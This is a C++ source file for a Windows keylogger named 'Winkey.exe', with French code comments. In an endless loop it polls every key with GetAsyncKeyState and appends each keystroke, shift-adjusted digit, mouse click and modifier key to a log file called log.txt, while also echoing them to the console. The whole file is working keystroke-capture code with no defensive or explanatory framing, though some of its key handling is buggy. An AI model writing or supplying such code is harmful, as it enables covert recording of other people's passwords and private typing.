// Compilation Command : g++ prog.cpp -std=c++11 -o Winkey.exe
#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

#define FILENAME_LOG "log.txt"
#define CAPITAL_TEXT "<CAPITAL>"


void WriteLog(string filename,const char* key) {
    ofstream write(filename, ios::app); //ios:app precise de ne pas re ecrire le fichier a chaque entrée
    if (write.is_open()) {
        write << key;
        write.close();
    }
}

void WriteLogChar(string filename, char key) {
    ofstream write(filename, ios::app);
    if (write.is_open()) {
        write << key;
        write.close();
    }
}

int keylistener(int key) {
    switch (key) 
    {

	case VK_SPACE:
		cout << " ";
		WriteLog(FILENAME_LOG," ");
		return 0;
	
	case VK_RETURN:
		cout << "\n";
		WriteLog(FILENAME_LOG,"\n");
		return 0;
	
	case '¾':
		cout << ".";
		WriteLog(FILENAME_LOG,".");
		return 0;
	
	case VK_SHIFT:
		cout << "<SHIFT>";
		WriteLog(FILENAME_LOG,"<SHIFT>");
		return 0;
	
	case VK_BACK:
		cout << "\b";
		WriteLog(FILENAME_LOG,"\b");
		return 0;
	
	case VK_RBUTTON:
		cout << "<R_CLICK>";
		WriteLog(FILENAME_LOG,"<RIGHT_CLICK>");
		return 0;

	case VK_LBUTTON:
		cout << "<R_LEFT>";
		WriteLog(FILENAME_LOG, "<LEFT_CLICK>");
		return 0;
	
	case VK_CAPITAL:
		cout << CAPITAL_TEXT;
		WriteLog(FILENAME_LOG,CAPITAL_TEXT);
		return 0;

	case VK_BROWSER_HOME:
		cout << "<BROWSER_HOME>";
		return 0;
	
	case VK_TAB:
		cout << "<TAB>";
		WriteLog(FILENAME_LOG,"<TAB>");
		return 0;
	
	case VK_DOWN:
		cout << "<DOWN>";
		WriteLog(FILENAME_LOG,"<DOWN_ARROW_KEY>");
		return 0;

	case VK_LEFT:
		cout << "<LEFT>";
		WriteLog(FILENAME_LOG,"<LEFT_ARROW_KEY>");
		return 0;

	case VK_RIGHT:
		cout << "<RIGHT>";
		WriteLog(FILENAME_LOG,"<RIGHT_ARROW_KEY>");
		return 0;

	case VK_CONTROL:
		cout << "<CTRL>";
		WriteLog(FILENAME_LOG,"<CTRL>");
		return 0;

	case VK_MENU:
		cout << "<ALT>";
		WriteLog(FILENAME_LOG, "<ALT>");
		return 0;
    }
}

int main()
{
	char keyword;
	while (true) // or for(;;)
	{
		Sleep(10);
		for (keyword = 8; keyword <= 127; keyword++) { // for contains characters within 8 and 127
			if (GetAsyncKeyState(keyword) == -32767)
			{

				if ((keyword > 64))
				{
					if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
					{
						if (keyword < 91) {
							cout << keyword;
							WriteLogChar(FILENAME_LOG, keyword);
						}
					}
					else {
						keyword += 32;
						if (keyword > 91) {
							cout << keyword;
							WriteLogChar(FILENAME_LOG, keyword);
						}
					}
				}

				else if ((keyword > 33) && (keyword < 64)) {

					if (keyword == 48)
					{
						if (GetAsyncKeyState(0x10))
						{
							cout << ")";
							WriteLog(FILENAME_LOG, ")");
						}
						else {
							cout << "0";
							WriteLog(FILENAME_LOG, "0");
						}
					}

					else if (keyword == 49)
					{
						if (GetAsyncKeyState(0x10))
						{
							cout << "!";
							WriteLog(FILENAME_LOG, "!");
						}
						else {
							cout << "1";
							WriteLog(FILENAME_LOG, "1");
						}
					}

					else if (keyword == 50)
					{
						if (GetAsyncKeyState(0x10))
						{
							cout << "\"";
							WriteLog(FILENAME_LOG, "\"");
						}
						else {
							cout << "2";
							WriteLog(FILENAME_LOG, "2");
						}
					}

					else if (keyword == 51)
					{
						if (GetAsyncKeyState(0x10))
						{
							cout << "£";
							WriteLog(FILENAME_LOG, "£");
						}
						else {
							cout << "3";
							WriteLog(FILENAME_LOG, "3");
						}
					}

					else if (keyword == 52)
					{
						if (GetAsyncKeyState(0x10))
						{
							cout << "$";
							WriteLog(FILENAME_LOG, "$");
						}
						else {
							cout << "4";
							WriteLog(FILENAME_LOG, "4");
						}
					}

					else if (keyword == 53)
					{
						if (GetAsyncKeyState(0x10))
						{
							cout << "%";
							WriteLog(FILENAME_LOG, "%");
						}
						else {
							cout << "5";
							WriteLog(FILENAME_LOG, "5");
						}
					}

					else if (keyword == 54)
					{
						if (GetAsyncKeyState(0x10))
						{
							cout << "^";
							WriteLog(FILENAME_LOG, "^");
						}
						else {
							cout << "6";
							WriteLog(FILENAME_LOG, "6");
						}
					}

					else if (keyword == 57)
					{
						if (GetAsyncKeyState(0x10))
						{
							cout << "(";
							WriteLog(FILENAME_LOG, "(");
						}
						else {
							cout << "9";
							WriteLog(FILENAME_LOG, "9");
						}
					}

					else if (keyword == 56)
					{
						if (GetAsyncKeyState(0x10))
						{
							cout << "*";
							WriteLog(FILENAME_LOG, "*");
						}
						else {
							cout << "8";
							WriteLog(FILENAME_LOG, "8");
						}
					}

					else if (keyword == 55)
					{
						if (GetAsyncKeyState(0x10))
						{
							cout << "&";
							WriteLog(FILENAME_LOG, "&");
						}
						else {
							cout << "7";
							WriteLog(FILENAME_LOG, "7");
						}
					}
				}
				else {
					keylistener(keyword);
					break;
				}
			}
		}
	}
	return 0;
}
